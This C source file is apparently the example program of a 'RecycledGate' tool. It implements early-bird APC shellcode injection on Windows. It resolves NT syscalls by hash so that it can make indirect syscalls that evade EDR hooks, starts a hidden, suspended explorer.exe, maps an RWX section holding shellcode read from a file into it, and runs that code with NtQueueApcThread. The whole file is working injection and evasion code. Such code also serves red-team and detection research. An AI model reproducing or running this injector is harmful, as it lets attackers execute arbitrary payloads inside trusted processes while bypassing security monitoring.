#include "windows.h"

#include "Defines.h"
#include "../src/RecycledGate.h"

#include "stdio.h"

extern void PrepareSyscall(DWORD dwSycallNr, PVOID dw64Gate);
extern DoSyscall();

PVOID findNtDll(void);
DWORD getSyscall(DWORD crypted_hash, Syscall* pSyscall);

int
main(int argc, char** argv) {


	DWORD dwSuccess = FAIL, dwRead = 0;
	NTSTATUS ntStatus = 0;
	SIZE_T sizeBuffer = 0;

	Syscall sysNtCreateSection = { 0x00 }, sysNtMapViewOfSection = { 0x00 }, sysNtQueueApcThread = { 0x00 }, sysNtResumeThread = { 0x00 }, sysNtCreateThreadEx = { 0x00 };
	HANDLE hSection = NULL, hFile = NULL;
	PVOID pViewLocal = NULL, pViewRemote = NULL, pSH = NULL;

	STARTUPINFOA si = { 0x00 };
	PROCESS_INFORMATION pi = { 0x00 };

	if (argc < 2) {
		printf("%s shellcode.bin\n", argv[0]);
		goto exit;
	}

	dwSuccess = getSyscall(0x916c6394, &sysNtCreateSection);
	if (dwSuccess == FAIL)
		goto exit;

	dwSuccess = getSyscall(0x625d5a2e, &sysNtMapViewOfSection);
	if (dwSuccess == FAIL)
		goto exit;

	dwSuccess = getSyscall(0x9523617c, &sysNtQueueApcThread);
	if (dwSuccess == FAIL)
		goto exit;

	dwSuccess = getSyscall(0x6d397e74, &sysNtResumeThread);
	if (dwSuccess == FAIL)
		goto exit;

	dwSuccess = getSyscall(0x8a4e6274, &sysNtCreateThreadEx);
	if (dwSuccess == FAIL)
		goto exit;

	hFile = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open: %s\n", argv[1]);
		goto exit;
	}

	sizeBuffer = GetFileSize(hFile, NULL);
	if (sizeBuffer == 0) {
		printf("[-] File is empty?\n");
		goto exit;
	}

	pSH = VirtualAlloc(0, sizeBuffer, MEM_COMMIT, PAGE_READWRITE);
	if (pSH == NULL) {
		printf("Out of memory o.0\n");
		goto exit;
	}

	dwSuccess = ReadFile(hFile, pSH, (DWORD)sizeBuffer, &dwRead, NULL);
	if (dwSuccess == 0) {
		printf("[*] Failed to read\n");
		goto exit;
	}

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.dwFlags |= STARTF_USESTDHANDLES;

	dwSuccess = CreateProcessA("C:\\Windows\\explorer.exe", NULL, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi);
	if (dwSuccess == FAIL)
		goto exit;

	PrepareSyscall(sysNtCreateSection.dwSyscallNr, sysNtCreateSection.pRecycledGate);
	ntStatus = DoSyscall(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sizeBuffer, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] Failed to create section\n");
		goto exit;
	}
	printf("[*] Created section: 0x%p\n", hSection);

	PrepareSyscall(sysNtMapViewOfSection.dwSyscallNr, sysNtMapViewOfSection.pRecycledGate);
	ntStatus = DoSyscall(hSection, GetCurrentProcess(), &pViewLocal, 0, 0, NULL, (PLARGE_INTEGER)&sizeBuffer, 2, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] Failed to map view of section locally\n");
		goto exit;
	}
	printf("[*] Mapped section locally: 0x%p\n", pViewLocal);

	PrepareSyscall(sysNtMapViewOfSection.dwSyscallNr, sysNtMapViewOfSection.pRecycledGate);
	ntStatus = DoSyscall(hSection, pi.hProcess, &pViewRemote, 0, 0, NULL, &sizeBuffer, 2, 0, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] Failed to map view of section remotely\n");
		goto exit;
	}
	printf("[*] Mapped section remote: 0x%p\n", pViewRemote);

	for (int i = 0; i < sizeBuffer; i++)
		*((PBYTE)pViewLocal + i) = *((PBYTE)pSH + i);

	/*HANDLE hHostThread = INVALID_HANDLE_VALUE;
	PrepareSyscall(sysNtCreateThreadEx.dwSyscallNr, sysNtCreateThreadEx.pRecycledGate);
	ntStatus = DoSyscall(&hHostThread, 0x1FFFFF, NULL, (HANDLE)pi.hProcess, (LPTHREAD_START_ROUTINE)pViewRemote, NULL, FALSE, NULL, NULL, NULL, NULL);

	printf("now doing");
	getchar();*/

	PrepareSyscall(sysNtQueueApcThread.dwSyscallNr, sysNtQueueApcThread.pRecycledGate);
	ntStatus = DoSyscall(pi.hThread, (PKNORMAL_ROUTINE)pViewRemote, pViewRemote, NULL, NULL);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] Failed to call NtQueueApcThread\n");
		goto exit;
	}
	printf("[*] NtQueueApcThread successfull\n");


	PrepareSyscall(sysNtResumeThread.dwSyscallNr, sysNtResumeThread.pRecycledGate);
	ntStatus = DoSyscall(pi.hThread, NULL);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] Failed to resume thread\n");
		goto exit;
	}
	printf("[*] Resumed thread\n");


	dwSuccess = SUCCESS;

exit:

	if (pi.hProcess)
		CloseHandle(pi.hProcess);

	if (pi.hThread)
		CloseHandle(pi.hThread);

	return dwSuccess;

}

